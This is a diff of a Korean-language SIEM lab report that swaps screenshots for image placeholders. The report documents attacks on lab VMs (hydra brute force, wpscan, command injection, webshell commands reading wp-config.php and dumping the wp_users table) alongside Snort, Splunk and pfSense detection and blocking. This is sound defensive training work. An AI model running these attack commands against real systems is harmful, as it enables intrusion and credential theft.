@@ -141,6 +141,28 @@
     font-style: italic;
   }
 
+  /* Image Placeholder */
+  .img-placeholder {
+    margin: 16px 0;
+    border: 2px dashed #2a5a8c;
+    border-radius: 8px;
+    padding: 30px 20px;
+    background: #f0f5fa;
+    text-align: center;
+    page-break-inside: avoid;
+  }
+  .img-placeholder .ph-label {
+    font-size: 10pt;
+    font-weight: 700;
+    color: #0c2340;
+    margin-bottom: 6px;
+  }
+  .img-placeholder .ph-desc {
+    font-size: 9pt;
+    color: #555;
+    line-height: 1.5;
+  }
+
   /* Code blocks */
   pre {
     background: #1e1e1e;
@@ -404,9 +426,19 @@
 
 <p>Phase 1에서 Bee-box 대상 기본 공격(정찰, SQLi, XSS, 명령주입, 브루트포스)을 수행하고 Phase 2에서 Snort 탐지 분석 및 방화벽 정책을 수립하였다.</p>
 
-<div class="img-container">
-  <img src="/home/user/siem-project/phase2-detect/images/fw-1st-after.png" alt="pfSense 방화벽 룰 설정">
-  <div class="img-caption">[그림 2-1] pfSense WAN 방화벽 룰 — Phase 2에서 공격자 IP(10.50.50.17) 차단 룰 적용</div>
+<div class="img-placeholder">
+  <div class="ph-label">[그림 2-1] VirtualBox VM 구성 화면</div>
+  <div class="ph-desc">VirtualBox Manager 화면 — 실습에 사용된 전체 VM 목록(att-mint, Kali, VyOS, pfSense, Bee-box, WordPress, MySQL, Splunk, mng-mint)과 각 VM의 설정 상태가 보이는 스크린샷</div>
+</div>
+
+<div class="img-placeholder">
+  <div class="ph-label">[그림 2-2] 네트워크 토폴로지 다이어그램</div>
+  <div class="ph-desc">전체 네트워크 구성도 — att-net(10.50.50.0/24), rf-net, dmz-net(10.0.10.0/24), inner-net(10.0.100.0/24), mng-net(10.0.50.0/24) 대역과 VyOS·pfSense를 중심으로 한 라우팅/NAT 구조를 보여주는 다이어그램 또는 화이트보드 캡처</div>
+</div>
+
+<div class="img-placeholder">
+  <div class="ph-label">[그림 2-3] pfSense WAN 방화벽 룰</div>
+  <div class="ph-desc">pfSense Firewall → Rules → WAN 화면 — Phase 2에서 공격자 IP(10.50.50.17) 차단 Block 룰이 적용된 상태의 방화벽 룰 목록 스크린샷</div>
 </div>
 
 <h2 class="section">2-2. 환경 확장 (Phase 2.5) — 왜 확장했는가</h2>
@@ -437,6 +469,11 @@ Kali   (10.50.50.30) ─┘                                  │
                                                      ├─ inner-net ──→ Splunk(10.0.100.50)
                                                      │                MySQL (10.0.100.60)
                                                      └─ mng-net ──→ mng-mint(10.0.50.17, 관제+정상유저)</div>
+
+<div class="img-placeholder">
+  <div class="ph-label">[그림 2-4] VirtualBox 네트워크 설정</div>
+  <div class="ph-desc">VirtualBox 호스트 네트워크 관리자 또는 VM별 네트워크 어댑터 설정 화면 — att-net, rf-net, dmz-net, inner-net, mng-net 각 내부 네트워크 설정이 보이는 스크린샷</div>
+</div>
 
 <h2 class="section">2-4. 자산 목록 및 로그 수집 체계</h2>
 
@@ -485,9 +522,9 @@ Kali   (10.50.50.30) ─┘                                  │
   <tr><td>R-4</td><td><code>dirb</code></td><td>숨은 경로 탐색</td><td>/drupal, /phpmyadmin, /webdav 발견</td></tr>
 </table>
 
-<div class="img-container">
-  <img src="/home/user/siem-project/phase1-attack/images/R-1-nmap.png" alt="Nmap 포트 스캔 결과">
-  <div class="img-caption">[그림 3-1] Nmap TCP 포트 스캔 — 80/tcp(HTTP)만 열려있어 웹 공격에 집중</div>
+<div class="img-placeholder">
+  <div class="ph-label">[그림 3-1] Nmap TCP 포트 스캔 결과</div>
+  <div class="ph-desc">터미널에서 nmap -sS 실행 결과 — Bee-box(bWAPP) 대상 TCP 포트 스캔 결과로 80/tcp(HTTP)만 열려있는 것이 보이는 스크린샷</div>
 </div>
 
 <h3 class="subsection">주요 공격 수행</h3>
@@ -503,19 +540,19 @@ Kali   (10.50.50.30) ─┘                                  │
   <tr><td>E-7 브루트포스</td><td>hydra</td><td>bWAPP 로그인</td><td>비밀번호 사전 공격</td><td>탐지됨</td></tr>
 </table>
 
-<div class="img-container">
-  <img src="/home/user/siem-project/phase1-attack/images/E-5-cmdi-whoami.png" alt="OS 명령 주입 공격">
-  <div class="img-caption">[그림 3-2] OS Command Injection — DNS lookup 필드에 명령 삽입, www-data 권한 확인</div>
+<div class="img-placeholder">
+  <div class="ph-label">[그림 3-2] OS Command Injection 공격</div>
+  <div class="ph-desc">bWAPP OS Command Injection 페이지 — DNS lookup 입력 필드에 명령 삽입(;whoami 등) 후 www-data 권한이 출력된 브라우저 화면 스크린샷</div>
 </div>
 
-<div class="img-container">
-  <img src="/home/user/siem-project/phase1-attack/images/E-7-bruteforce.png" alt="Hydra 브루트포스 공격">
-  <div class="img-caption">[그림 3-3] Hydra 브루트포스 — bWAPP 로그인 페이지 대상 사전 공격 수행</div>
+<div class="img-placeholder">
+  <div class="ph-label">[그림 3-3] Hydra 브루트포스 공격</div>
+  <div class="ph-desc">터미널에서 hydra 실행 결과 — bWAPP 로그인 페이지 대상 사전 공격(rockyou.txt) 수행 중 또는 완료 후 비밀번호 크래킹 성공 메시지가 보이는 스크린샷</div>
 </div>
 
-<div class="img-container">
-  <img src="/home/user/siem-project/phase1-attack/images/E-1-sqli.png" alt="Splunk에서 SQL Injection 탐지">
-  <div class="img-caption">[그림 3-4] Splunk에서 SQL Injection 공격 탐지 — ET WEB_SERVER SELECT USER SQL Injection 이벤트</div>
+<div class="img-placeholder">
+  <div class="ph-label">[그림 3-4] Splunk SQL Injection 탐지</div>
+  <div class="ph-desc">Splunk 검색 결과 화면 — index=pfsense에서 ET WEB_SERVER SELECT USER SQL Injection 이벤트가 탐지된 로그 목록 스크린샷</div>
 </div>
 
 <div class="page-break"></div>
@@ -547,6 +584,11 @@ wpscan --url http://10.0.0.254:8080 --enumerate vp,vt,u --disable-tls-checks --f
 # WordPress 7.1, XML-RPC 활성화, Upload 디렉토리 리스팅
 # Snort 탐지: pfSense SID 1000001 "LOCAL WordPress wpscan detected" → 1,973 이벤트</code></pre>
 
+<div class="img-placeholder">
+  <div class="ph-label">[그림 3-5] WPScan 실행 결과</div>
+  <div class="ph-desc">Kali 터미널에서 WPScan 실행 화면 — WordPress 버전(7.1), XML-RPC 활성화, 열거된 플러그인/테마/사용자 정보 등이 표시된 결과 스크린샷</div>
+</div>
+
 <h3 class="subsection">킬체인 상세: 브루트포스 (hydra)</h3>
 <pre><code># Kali (10.50.50.30)
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
@@ -555,6 +597,11 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 
 # 결과: 965건 시도 후 admin/rlaquddn1@ 크래킹 성공
 # Splunk Alert: Brute Force Detection (Critical) 트리거</code></pre>
+
+<div class="img-placeholder">
+  <div class="ph-label">[그림 3-6] Hydra 브루트포스 (WordPress)</div>
+  <div class="ph-desc">Kali 터미널에서 hydra 실행 결과 — WordPress wp-login.php 대상 사전 공격으로 admin/rlaquddn1@ 크래킹 성공 메시지가 표시된 스크린샷</div>
+</div>
 
 <h3 class="subsection">킬체인 상세: 웹쉘 명령 실행</h3>
 <pre><code># 웹쉘을 통한 시스템 명령 실행
@@ -567,12 +614,27 @@ http://10.0.0.254:8080/?cmd=cat+wp-config.php
   → DB_NAME: wordpress, DB_USER: wp_admin, DB_PASSWORD: WpAdmin!2024
   → DB_HOST: 10.0.100.60</code></pre>
 
+<div class="img-placeholder">
+  <div class="ph-label">[그림 3-7] 웹쉘 명령 실행 (cmd=id)</div>
+  <div class="ph-desc">브라우저에서 /?cmd=id 또는 /?cmd=whoami 실행 결과 — uid=33(www-data) 응답이 표시된 화면, 또는 /?cmd=cat+/etc/passwd로 시스템 계정 목록이 노출된 스크린샷</div>
+</div>
+
+<div class="img-placeholder">
+  <div class="ph-label">[그림 3-8] wp-config.php DB 인증정보 유출</div>
+  <div class="ph-desc">브라우저에서 /?cmd=cat+wp-config.php 실행 결과 — DB_NAME, DB_USER, DB_PASSWORD, DB_HOST 등 데이터베이스 접속 정보가 노출된 화면 스크린샷</div>
+</div>
+
 <h3 class="subsection">킬체인 상세: DB 데이터 탈취</h3>
 <pre><code># 웹쉘 경유 MySQL 직접 접근
 http://10.0.0.254:8080/?cmd=mysql+-u+wp_admin+-pWpAdmin!2024+-h+10.0.100.60+wordpress+
   -e+"SELECT+user_login,user_email,user_pass+FROM+wp_users"
 
 # 결과: admin 계정 정보 유출 (user_login, user_email, user_pass bcrypt 해시)</code></pre>
+
+<div class="img-placeholder">
+  <div class="ph-label">[그림 3-9] DB 데이터 탈취 (wp_users)</div>
+  <div class="ph-desc">브라우저에서 웹쉘 경유 MySQL 쿼리 실행 결과 — wp_users 테이블의 user_login, user_email, user_pass(bcrypt 해시) 데이터가 노출된 화면 스크린샷</div>
+</div>
 
 <div class="page-break"></div>
 
@@ -595,9 +657,9 @@ http://10.0.0.254:8080/?cmd=mysql+-u+wp_admin+-pWpAdmin!2024+-h+10.0.100.60+word
   <strong>교훈:</strong> Snort 브루트포스 탐지(8건)와 Apache 로그 기반 탐지(965건)의 극심한 차이 발견. Snort는 네트워크 패킷 레벨에서 HTTP POST body를 제한적으로 검사하므로, 브루트포스 탐지에는 <strong>Apache 로그 기반 Alert이 주 탐지 소스</strong>가 되어야 한다.
 </div>
 
-<div class="img-container">
-  <img src="/home/user/siem-project/phase2-detect/images/snort-alerts-overview.png" alt="pfSense Snort Alerts 화면">
-  <div class="img-caption">[그림 4-1] pfSense Snort Alerts — WAN 인터페이스에서 탐지된 경보 목록</div>
+<div class="img-placeholder">
+  <div class="ph-label">[그림 4-1] pfSense Snort Alerts 화면</div>
+  <div class="ph-desc">pfSense → Services → Snort → Alerts 화면 — WAN 인터페이스에서 탐지된 Snort 경보 목록(SID 1000001 WPScan, SID 1000002 브루트포스, SID 1000004 SQLi 등)이 표시된 스크린샷</div>
 </div>
 
 <h2 class="section">4-2. ModSecurity WAF</h2>
@@ -639,14 +701,19 @@ http://10.0.0.254:8080/?cmd=mysql+-u+wp_admin+-pWpAdmin!2024+-h+10.0.100.60+word
   <tr><td><strong>db_approach</strong></td><td>DB 접근 로그</td><td>웹쉘 경유 접근 기록</td></tr>
 </table>
 
-<div class="img-container">
-  <img src="/home/user/siem-project/phase2-detect/images/splunk-timechart.png" alt="Splunk Timechart">
-  <div class="img-caption">[그림 4-2] Splunk Timechart — Snort Priority 이벤트의 시간대별 분포 (공격 시간대 급증 확인)</div>
+<div class="img-placeholder">
+  <div class="ph-label">[그림 4-4] SOC 대시보드 (SOC_Monitor) 전체 화면</div>
+  <div class="ph-desc">Splunk SOC_Monitor 대시보드 전체 화면 — events(총 이벤트 수), time(시간대별 추이), att_type(공격 유형 파이차트), att_ip(공격자 IP Top5), waf(WAF 탐지), login_history(로그인 시도 IP별), db_approach(DB 접근) 등 7개 패널이 모두 보이는 스크린샷. 공격 전후 비교가 가능하면 더 좋음</div>
 </div>
 
-<div class="img-container">
-  <img src="/home/user/siem-project/phase2-detect/images/splunk-src-stats.png" alt="Splunk 공격자 IP 통계">
-  <div class="img-caption">[그림 4-3] Splunk 공격자 IP 통계 — 10.50.50.17 출발 Priority 이벤트 1,142건 확인</div>
+<div class="img-placeholder">
+  <div class="ph-label">[그림 4-5] Splunk Timechart (시간대별 이벤트)</div>
+  <div class="ph-desc">Splunk 검색 결과 — Snort Priority 이벤트의 시간대별 분포 Timechart. 공격 시간대(18:49~19:40 KST)에 이벤트 수가 급증하는 그래프가 보이는 스크린샷</div>
+</div>
+
+<div class="img-placeholder">
+  <div class="ph-label">[그림 4-6] Splunk 공격자 IP 통계</div>
+  <div class="ph-desc">Splunk 검색 결과 — 출발지 IP별 Priority 이벤트 통계 (stats count by src_ip). 10.50.50.30(Kali) 또는 10.50.50.17(att-mint)에서의 대량 이벤트가 집계된 화면 스크린샷</div>
 </div>
 
 <div class="page-break"></div>
@@ -668,6 +735,16 @@ http://10.0.0.254:8080/?cmd=mysql+-u+wp_admin+-pWpAdmin!2024+-h+10.0.100.60+word
   <tr><td>19:35:01</td><td><strong>Webshell Detection</strong></td><td><strong>Critical</strong></td><td>/?cmd=id, /?cmd=whoami 등</td></tr>
   <tr><td>19:40:02</td><td>WAF Alert Surge</td><td>Medium</td><td>웹쉘 → ModSecurity 탐지</td></tr>
 </table>
+
+<div class="img-placeholder">
+  <div class="ph-label">[그림 5-1] Splunk Triggered Alerts 목록</div>
+  <div class="ph-desc">Splunk → Activity → Triggered Alerts 화면 — Brute Force Detection(Critical), SQL Injection Detection(Critical), Webshell Detection(Medium), WAF Alert Surge(Medium) 등 트리거된 경보 목록이 시각과 함께 표시된 스크린샷</div>
+</div>
+
+<div class="img-placeholder">
+  <div class="ph-label">[그림 5-2] Splunk Alert 상세 화면</div>
+  <div class="ph-desc">Splunk Triggered Alert 중 하나(예: Brute Force Detection)를 클릭했을 때 보이는 상세 화면 — 트리거 시각, 심각도, 매칭된 이벤트 수 등이 표시된 스크린샷</div>
+</div>
 
 <h2 class="section">5-2. 정탐/오탐 판별</h2>
 
@@ -755,14 +832,19 @@ http://10.0.0.254:8080/?cmd=mysql+-u+wp_admin+-pWpAdmin!2024+-h+10.0.100.60+word
   <tr><td><strong>기존 차단</strong></td><td>att-mint(10.50.50.17)도 Phase 2에서 Block 처리 완료</td></tr>
 </table>
 
-<div class="img-container">
-  <img src="/home/user/siem-project/phase2-detect/images/snort-block-verify.png" alt="차단 후 재공격 검증">
-  <div class="img-caption">[그림 6-1] 차단 후 재공격 검증 — Nmap 스캔 시 80/tcp만 응답, curl 타임아웃 확인</div>
+<div class="img-placeholder">
+  <div class="ph-label">[그림 6-1] pfSense WAN Block 룰 설정</div>
+  <div class="ph-desc">pfSense Firewall → Rules → WAN 화면 — 10.50.50.30(Kali) TCP 전체 차단 Block 룰이 WAN 룰 최상단에 배치된 상태의 스크린샷. 10.50.50.17(att-mint) Block 룰도 함께 보이면 좋음</div>
 </div>
 
-<div class="img-container">
-  <img src="/home/user/siem-project/phase2-detect/images/snort-block-after.png" alt="Snort Block 설정">
-  <div class="img-caption">[그림 6-2] Snort Block Settings — Block Offenders 활성화, Legacy Mode, Kill States 설정</div>
+<div class="img-placeholder">
+  <div class="ph-label">[그림 6-2] 차단 검증 — curl 타임아웃</div>
+  <div class="ph-desc">Kali 터미널에서 차단 후 재공격 검증 — curl -s --max-time 10 "http://10.0.0.254:8080/" 실행 시 응답 없음(타임아웃)이 확인된 스크린샷</div>
+</div>
+
+<div class="img-placeholder">
+  <div class="ph-label">[그림 6-3] 차단 검증 — WPScan 실패</div>
+  <div class="ph-desc">Kali 터미널에서 WPScan 재실행 결과 — "Scan Aborted: The url supplied seems to be down (Timeout was reached)" 메시지가 표시된 스크린샷</div>
 </div>
 
 <div class="page-break"></div>
